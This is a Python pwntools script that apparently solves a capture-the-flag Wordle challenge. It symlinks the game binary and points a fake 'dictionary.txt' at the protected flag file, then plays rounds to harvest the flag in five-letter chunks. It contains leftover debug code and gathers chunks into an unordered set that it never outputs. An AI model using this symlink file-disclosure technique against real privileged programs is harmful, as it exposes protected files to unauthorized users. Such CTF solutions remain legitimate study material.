#!/usr/bin/env python3
from pwn import *
import tempfile
import os
import sys
import string

# The Wordle word size
WORD_SIZE = 5

# Defines our alphabet
ALPHABET = string.ascii_uppercase + '_{}'

# Defines the hit and miss marker
HIT_MARKER = b'Great job on guessing the word '
MISS_MARKER = b'You failed guessing the word '

def recv_until_next_input(p, timeout=0.01):
    """
        Received all output until next input is required.
    """

    # Receive until a timeout
    output = b''
    while True:
        new_output = p.recv(timeout=timeout)
        if new_output == b'':
            return output
        output += new_output

def find_dictionary_word(p, dictionary_words):
    """
        Finds a dictionary word.
    """
    
    # Receive until we wait for input
    recv_until_next_input(p)
 
    # Iterate all options
    attempt_num = 0
    with log.progress('Attempting to get one dictionary word') as pbar:
        for candidate in dictionary_words:

            # Send candidate and receive output
            attempt_num += 1
            pbar.status(f'({attempt_num} / {len(dictionary_words)})')
            p.sendline(candidate.encode())
            output = recv_until_next_input(p)
            
            # Check if output has meaningful data
            if b'ERROR' not in output:
                pbar.success(f'"{candidate}"')
                return candidate 

    # Should never happen
    raise Exception('Was not able to find any dictionary words')

def run_symlink_attack(target_dir):
    """
        Runs the symlink attack and returns the following tuple:
            1. The process to interact with.
            2. The number of words in the flag.
    """

    # Conclude paths
    exe_target_file = os.path.join(target_dir, 'wordle')
    flag_target_file = os.path.join(target_dir, 'flag.txt')
    assert os.path.isfile(exe_target_file), Exception(f'Could not find target executable file under directory "{target_dir}"')
    assert os.path.isfile(flag_target_file), Exception(f'Could not find target flag file under directory "{target_dir}"')

    # Get the flag size
    flag_size = os.stat(flag_target_file).st_size
    assert flag_size % WORD_SIZE == 0, Exception(f'Flag size {flag_size} must divide by {WORD_SIZE}')
    flag_words = flag_size // WORD_SIZE
    log.info(f'Flag is {flag_size} bytes = {flag_words} words')

    # Create a symlink for executable
    temp_dir = tempfile.mkdtemp()
    exe_symlink_path = os.path.join(temp_dir, 'sym')
    os.symlink(exe_target_file, exe_symlink_path)
    log.info(f'Created symlink for executable at "{exe_symlink_path}"')

    # Create a symlink for the flag
    flag_symlink_path = os.path.join(temp_dir, 'dictionary.txt')
    os.symlink(flag_target_file, flag_symlink_path)
    log.info(f'Created symlink for flag at "{flag_symlink_path}"')

    # Run process
    p = process(exe_symlink_path, stdin=process.PTY, stdout=process.PTY)
    return (p, flag_words)

def get_dictionary_words(target_dir):
    """
        Get the original dictionary words.
    """

    # Read the original dictionary
    dict_file = os.path.join(target_dir, 'dictionary.txt')
    assert os.path.isfile(dict_file), Exception('Could not find dictionary file under target directory "{target_dir}"')
    with open(dict_file, 'r') as fp:
        content = fp.read()

    # Split to words
    assert len(content) % WORD_SIZE == 0, Exception(f'Original dictionary must divide by {WORD_SIZE}')
    return [ content[i:i+WORD_SIZE] for i in range(0, len(content), WORD_SIZE) ]

def solve():
    """
        Solves the challenge.
    """

    # Catch exceptions
    try:

        # Parse argument and run extensive checks
        assert len(sys.argv) >= 2, Exception('Missing target directory argument')
        target_dir = os.path.abspath(sys.argv[1])
        assert os.path.isdir(target_dir), Exception(f'Path is not a directory: "{target_dir}"')
        log.info(f'Target directory is "{target_dir}"')

        # Get the dictionary words
        dictionary_words = get_dictionary_words(target_dir)

        # Run symlink attack
        p, flag_words = run_symlink_attack(target_dir)

        # Find a dictionary word
        dictionary_word = find_dictionary_word(p, dictionary_words) 

        # Continue until we get enough words
        with log.progress('Playing until we get enough chunks') as pbar:
            gathered_words = set()
            while len(gathered_words) < flag_words:

                # Set initial output
                output = b''

                # Exhaust all attempts with dictionary word
                while b'Play again [Y/N]:' not in output:

                    # Send next dictionary word
                    p.sendline(dictionary_word.encode())
                    output = recv_until_next_input(p)
                    if b'Great job' in output:
                        import pdb; pdb.set_trace

                # Extract word
                if HIT_MARKER in output:
                    marker = HIT_MARKER
                elif MISS_MARKER in output:
                    marker = MISS_MARKER
                else:
                    raise Exception('Unexpected output from program')
                word = ''.join([ c for c in output.split(marker)[1].split(b'\n')[0].decode() if c in ALPHABET ])
                assert len(word) == WORD_SIZE, Exception(f'Got an unexpected word "{word}"')
                if word not in gathered_words:
                    gathered_words.add(word)
                    log.info(f'Got new chunk: "{word}"')
                    pbar.status(len(gathered_words))

                # Continue playing
                p.sendline(b'Y')

            # Success status
            pbar.success(f'Got {flag_words} chunks.')

    # Log exceptions and quit
    except IOError as ex:
        log.error(f'{ex}')

if __name__ == '__main__':
    solve()

